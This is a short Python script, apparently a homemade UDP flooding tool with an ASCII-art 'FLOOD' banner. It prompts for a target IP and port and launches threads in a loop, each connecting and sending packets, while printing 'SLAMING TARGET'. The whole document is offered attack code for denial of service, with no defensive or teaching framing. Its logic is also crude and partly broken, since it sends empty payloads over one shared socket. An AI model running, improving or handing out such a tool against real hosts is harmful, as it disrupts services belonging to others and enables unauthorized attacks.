import socket
import threading
import time

print ("@@@@@@@@ @@@      @@@@@@@@   @@@@@@@@  @@@@@@@@")
print ("@@@@@@@@ @@@     @@@@@@@@@@ @@@@@@@@@@ @@@   @@@@")
print ("@@!      @@!     @@!   @@@@ @@!   @@@@ @@!     @@@")
print ("!@!      !@!     !@!  @!@!@ !@!  @!@!@ !@!      @!@")
print ("@!!!:!   @!!     @!@ @! !@! @!@ @! !@! @!@      !@!")
print ("!!!!!:   !!!     !@!!!  !!! !@!!!  !!! !@!      !!!")
print ("!!:      !!:     !!:!   !!! !!:!   !!! !!:      !!!")
print (":!:      :!:     :!:    !:! :!:    !:! :!:     !:!")
print (":::      ::::::: :::::::::: :::::::::: ;::    :::")
print (":::      :::::::  ::::::::   ::::::::  :::::::::")

host = str(input(" IP:"))
port = int(input(" PORT:"))
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
num_requests = 100000000000

def attack():
    s.connect((host, port))
    s.sendall(b"")

    print("---THREADS INITIALIZED SLAMING TARGET---")

threads = []

for i in range(num_requests):
    process = threading.Thread(target=attack)
    process.start()
    threads.append(process)

    time.sleep(0.01)

for current_thread in threads:
    current_thread.join()
